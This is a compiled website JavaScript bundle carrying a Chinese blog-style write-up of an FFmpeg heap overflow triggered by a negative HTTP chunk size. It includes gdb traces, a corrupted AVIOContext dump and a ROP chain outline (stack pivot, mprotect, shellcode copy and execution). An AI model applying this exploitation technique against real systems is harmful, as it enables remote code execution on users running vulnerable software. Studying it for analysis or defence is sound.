(window.webpackJsonp=window.webpackJsonp||[]).push([[4],{277:function(e,t,r){e.exports=r.p+"assets/img/call_rax.d7ca485d.png"},278:function(e,t,r){e.exports=r.p+"assets/img/pop_rsp.3523a9e5.png"},279:function(e,t,r){e.exports=r.p+"assets/img/continue.fcc1da0e.png"},280:function(e,t,r){e.exports=r.p+"assets/img/mprotect.d7c002c5.png"},281:function(e,t,r){e.exports=r.p+"assets/img/mov.49c7fc42.png"},282:function(e,t,r){e.exports=r.p+"assets/img/shellcode.8f5f5a82.png"},358:function(e,t,r){"use strict";r.r(t);var s=[function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("div",{staticClass:"content"},[s("h1",{attrs:{id:"_0x1-漏洞分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x1-漏洞分析","aria-hidden":"true"}},[e._v("#")]),e._v(" 0x1 漏洞分析")]),e._v(" "),s("p",[e._v("size是一个负数的时候，在recv函数出现堆溢出。\n在http_read_stream函数中，当s->chunksize=-1， size = -1。")]),e._v(" "),s("table",[s("thead",[s("tr",[s("th",[e._v("tcp_read <-")]),e._v(" "),s("th",[e._v("retry_transfer_wrapper <-")]),e._v(" "),s("th",[e._v("ffurl_read <-")]),e._v(" "),s("th",[e._v("http_buf_read <-")]),e._v(" "),s("th",[e._v("http_read_stream")])])]),e._v(" "),s("tbody",[s("tr",[s("td",[e._v("recv(s->fd, buf, size, 0);")]),e._v(" "),s("td",[e._v("transfer_func(h, buf + len, size - len);")]),e._v(" "),s("td",[e._v("retry_transfer_wrapper(h, buf, size, 1, h->prot->url_read);")]),e._v(" "),s("td",[e._v("ffurl_read(s->hd, buf, size);")]),e._v(" "),s("td",[e._v("s->chunksize = strtoll(line, NULL, 16);"),s("br"),e._v(" size = FFMIN(size, s->chunksize);"),s("br"),e._v("read_ret = http_buf_read(h, buf, size);")])]),e._v(" "),s("tr",[s("td",[e._v("gdb-peda# p size "),s("br"),e._v(" size = 0xffffffff  "),s("br"),e._v(" gdb-peda# p buf "),s("br"),e._v("buf = 0x1e75080")]),e._v(" "),s("td",[e._v("gdb-peda# p len\t"),s("br"),e._v("  len = 0x0  "),s("br"),e._v("gdb-peda# p size"),s("br"),e._v("\tsize = 0xffffffff "),s("br"),e._v(" gdb-peda# p buf "),s("br"),e._v("buf = 0x1e75080")]),e._v(" "),s("td",[e._v("gdb-peda# p size "),s("br"),e._v("  size = 0xffffffff\t"),s("br"),e._v(" gdb-peda# p buf "),s("br"),e._v("buf = 0x1e75080")]),e._v(" "),s("td",[e._v("gdb-peda# p size   "),s("br"),e._v("  size = 0xffffffff    "),s("br"),e._v(" gdb-peda# p buf "),s("br"),e._v("buf = 0x1e75080")]),e._v(" "),s("td",[e._v("s->chunksize = -1    "),s("br"),e._v("   size = -1")])])])]),e._v(" "),s("p",[e._v("http_read_stream :")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("....\n....\n\n\nif (s->end_chunked_post && !s->end_header) {\n\terr = http_read_header(h, &new_location);\n\tif (err < 0)\n\treturn err;\n}\n\n....\n....\n\n....\n....\n\nif (s->chunksize >= 0){\n\tif (!s->chunksize) {\n            char line[32];\n\t    do {\n        \tif ((err = http_get_line(s, line, sizeof(line))) < 0) \n                \treturn err; \n            } while (!*line); \n\t    s->chunksize = strtoll(line, NULL, 16);\n            ....\n\t    ....\n\t}\t\n\tsize = FFMIN(size, s->chunksize);\n}\n\n....\n....\n")])])]),s("p",[e._v("请求头中包含Transfer-Encoding: chunked时，执行到s->chunksize = strtoll(line, NULL, 16);。\nTransfer-Encoding: chunked 编码块值为-1的时，s->chunksize=-1")]),e._v(" "),s("table",[s("thead",[s("tr",[s("th",[e._v("http_read_header")]),e._v(" "),s("th",[e._v("process_line")]),e._v(" "),s("th",[e._v("http_read_stream")])])]),e._v(" "),s("tbody",[s("tr",[s("td"),e._v(" "),s("td",[e._v('if (!av_strcasecmp(tag, "Transfer-Encoding") &&av_strncasecmp(p, "chunked", 7))   '),s("br"),e._v("    s->filesize  = -1;   "),s("br"),e._v("  s->chunksize = 0;  "),s("br")]),e._v(" "),s("td",[e._v("s->chunksize = 0")])]),e._v(" "),s("tr",[s("td"),e._v(" "),s("td"),e._v(" "),s("td",[e._v("err = http_get_line(s, line, sizeof(line))")])]),e._v(" "),s("tr",[s("td"),e._v(" "),s("td"),e._v(" "),s("td",[e._v("gdb-peda$ x /s line "),s("br"),e._v('  0x7fffffffd1c0:\t"-1"')])])])]),e._v(" "),s("p",[e._v("变量buffer之后一段长度存在AVIOContext变量，覆盖AVIOContext中的函数指针变量，等下一次调用时控制eip")]),e._v(" "),s("table",[s("thead",[s("tr",[s("th",[e._v("ffio_fdopen")]),e._v(" "),s("th",[e._v("-> avio_alloc_context")]),e._v(" "),s("th",[e._v("-> ffio_init_context")])])]),e._v(" "),s("tbody",[s("tr",[s("td",[e._v("buffer = av_malloc(buffer_size);  "),s("br"),e._v("   gdb-peda p buffer "),s("br"),e._v("  buffer = (uint8_t *) 0x1e75080")]),e._v(" "),s("td",[e._v("AVIOContext *s = av_mallocz(sizeof(AVIOContext));  "),s("br"),e._v(" gdb-peda$ p s   "),s("br"),e._v("  s = (AVIOContext *) 0x1e7d0e0")]),e._v(" "),s("td",[e._v("s->buffer      = buffer; "),s("br"),e._v("  s->buffer_size = buffer_size; "),s("br"),e._v("s->opaque      = opaque;  "),s("br"),e._v("s->direct      = 0;   "),s("br"),e._v(" s->buf_ptr     = buffer;")])])])]),e._v(" "),s("p",[e._v("#　0x2 漏洞利用")]),e._v(" "),s("p",[e._v("AVIOContext 结构体")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("$1 = {\n  av_class = 0x4242424242424242, \n  buffer = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, \n  buffer_size = 0x42424242, \n  buf_ptr = 0x1e75080 'C' <repeats 200 times>..., \n  buf_end = 0x1e7d238 \"\", \n  opaque = 0x4242424242424242, \n  read_packet = 0x6161616161616161, \n  write_packet = 0x4242424242424242, \n  seek = 0x4242424242424242, \n  pos = 0x424242424242c3fa, \n  must_flush = 0x42424242, \n  eof_reached = 0x0, \n  write_flag = 0x61616161, \n  max_packet_size = 0x61616161, \n  checksum = 0x6161616161616161, \n  checksum_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>, \n  update_checksum = 0x6161616161616161, \n  error = 0x61616161, \n  read_pause = 0x6161616161616161, \n  read_seek = 0x6161616161616161, \n  seekable = 0x61616161, \n  maxsize = 0x6161616161616161, \n  direct = 0x61616161, \n  bytes_read = 0x616161616161e319, \n  seek_count = 0x61616161, \n  writeout_count = 0x61616161, \n  orig_buffer_size = 0x61616161, \n  short_seek_threshold = 0x61616161, \n  protocol_whitelist = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>, \n  protocol_blacklist = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>, \n  write_data_type = 0x6161616161616161, \n  ignore_boundary_point = 0x61616161, \n  current_type = 1633771873, \n  last_time = 0x6161616161616161\n}\n\n")])])]),s("p",[e._v("需要绕过下面的判断，才能调用read_packet函数。")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("...\n...\nif (s->eof_reached)\n    return\n...\n...\nif (s->read_packet && s->orig_buffer_size && s->buffer_size > s->orig_buffer_size) {\n    ...\n    av_assert0(len >= s->orig_buffer_size);\n}\n...\n...\nlen = s->read_packet(s->opaque, dst, len);\n")])])]),s("p",[s("img",{attrs:{src:r(277),alt:"avatar"}})]),e._v(" "),s("p",[e._v("利用可控的寄存器，把栈迁移到堆上")]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("call   rax;      >>>>>       push   rbx;  jmp    rdi;       >>>>>      pop    rsp; ret;\n")])])]),s("p",[s("img",{attrs:{src:r(278),alt:"avatar"}})]),e._v(" "),s("p",[e._v("利用add rsp, 0x58 调到连续可控的堆区域\n"),s("img",{attrs:{src:r(279),alt:"avatar"}})]),e._v(" "),s("p",[e._v("调用mprotect 设置0x00400000内存的权限\n"),s("img",{attrs:{src:r(280),alt:"avatar"}})]),e._v(" "),s("p",[e._v("利用 mov qword ptr [rcx], rax ; ret 把shellcode复制到0x00400000\n"),s("img",{attrs:{src:r(281),alt:"avatar"}})]),e._v(" "),s("p",[e._v("最后执行shellcode\n"),s("img",{attrs:{src:r(282),alt:"avatar"}})])])}],n=r(1),_=Object(n.a)({},function(){this.$createElement;this._self._c;return this._m(0)},s,!1,null,null,null);t.default=_.exports}}]);